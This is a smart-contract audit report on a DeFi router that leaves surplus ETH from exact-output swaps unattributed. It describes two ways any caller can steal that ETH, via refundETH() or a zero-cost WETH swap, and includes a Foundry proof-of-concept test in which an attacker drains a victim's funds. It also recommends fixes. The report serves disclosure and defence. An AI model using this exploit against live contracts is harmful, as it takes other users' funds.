### Title
Stranded ETH on the router is attributionless and can be stolen by any caller via `refundETH()` or a zero-cost WETH swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
The `pay()` function in `PeripheryPayments.sol` settles WETH payments by consuming `address(this).balance` (the router's total ETH balance) without any per-user attribution. When a user calls `exactOutputSingle` or `exactOutput` directly with ETH as the input token (WETH) and sends `amountInMaximum` ETH, only the actual `amountIn ≤ amountInMaximum` is consumed by the pool callback; the remainder is silently stranded on the router. Because `refundETH()` unconditionally sends the entire router ETH balance to `msg.sender`, and because `pay()` will consume any pre-existing router ETH balance to settle a subsequent caller's WETH swap, any attacker who observes stranded ETH can steal it in a single unprivileged call.

### Finding Description

**Root cause — `pay()` uses total router ETH balance, not per-user ETH:** [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // ← total router ETH, no attribution
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

`nativeBalance` is the router's aggregate ETH balance. Any ETH deposited by a prior caller that was not refunded is indistinguishable from the current caller's ETH.

**How ETH becomes stranded — `exactOutputSingle` / `exactOutput` with ETH:** [2](#0-1) 

`exactOutputSingle` is `external payable`. A user sends `amountInMaximum` ETH. The pool callback requests only `amountIn ≤ amountInMaximum`. `pay()` deposits exactly `amountIn` ETH as WETH and forwards it to the pool. The surplus `amountInMaximum − amountIn` ETH remains on the router with no record of who sent it. The function returns without refunding the excess.

**Theft vector 1 — `refundETH()` sends all ETH to `msg.sender`:** [3](#0-2) 

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ← no attribution check
    }
}
```

Any caller can invoke `refundETH()` and receive the entire router ETH balance, including ETH stranded by a different user.

**Theft vector 2 — zero-cost WETH swap consumes victim's ETH:**

An attacker calls `exactInputSingle{value: 0}(tokenIn=WETH, amountIn=stranded_amount)`. Inside `pay()`, `nativeBalance = stranded_amount ≥ value`, so the router deposits the victim's ETH as WETH and forwards it to the pool. The attacker receives the token output without spending any ETH or WETH of their own.

### Impact Explanation

A user who calls `exactOutputSingle{value: amountInMaximum}` or `exactOutput{value: amountInMaximum}` directly (not wrapped in a `multicall` that ends with `refundETH()`) loses the surplus ETH `amountInMaximum − amountIn` to the first caller who invokes `refundETH()` or executes a WETH-input swap. This is a direct, unconditional loss of user principal with no recovery path.

### Likelihood Explanation

`exactOutputSingle` and `exactOutput` are `external payable` and are the natural entry points for exact-output ETH swaps. Users who follow the pattern of sending `amountInMaximum` ETH and relying on the router to refund the difference — without knowing they must compose a `multicall` ending in `refundETH()` — will strand ETH on every exact-output ETH swap. The attack requires no privilege, no special token, and no coordination beyond observing the router's ETH balance.

### Recommendation

1. **Track per-caller ETH contributions in transient storage.** Record `msg.value` keyed to `msg.sender` at the entry of each payable swap function and allow `refundETH()` to return only the caller's own recorded contribution.
2. **Alternatively, auto-refund excess ETH at the end of `exactOutputSingle` / `exactOutput`.** After the pool callback settles `amountIn`, compute `address(this).balance` and transfer any remainder back to `msg.sender` before returning.
3. **Document the multicall+refundETH requirement prominently** in the NatSpec of every `external payable` swap function so integrators are not silently exposed.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Assume standard test setup: pool (WETH/token1), router, swapper, attacker.

function test_strandedEthStolenViaRefundETH() public {
    uint128 amountOut = 1_000;
    // Victim sends amountInMaximum = 2 ETH but only ~1 ETH is needed.
    uint256 amountInMaximum = 2 ether;

    uint256 victimEthBefore = swapper.balance;
    uint256 attackerEthBefore = attacker.balance;

    // Victim calls exactOutputSingle directly (no multicall, no refundETH).
    vm.prank(swapper);
    uint256 amountIn = router.exactOutputSingle{value: amountInMaximum}(
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: amountOut,
            amountInMaximum: uint128(amountInMaximum),
            recipient: swapper,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Surplus ETH is stranded on the router.
    uint256 stranded = amountInMaximum - amountIn;
    assertGt(stranded, 0, "ETH stranded on router");
    assertEq(address(router).balance, stranded, "router holds victim ETH");

    // Attacker steals it with a single refundETH() call.
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, attackerEthBefore + stranded, "attacker stole victim ETH");
    assertEq(address(router).balance, 0, "router drained");
    // Victim lost amountInMaximum instead of amountIn.
    assertEq(victimEthBefore - swapper.balance, amountInMaximum, "victim overpaid");
}
```
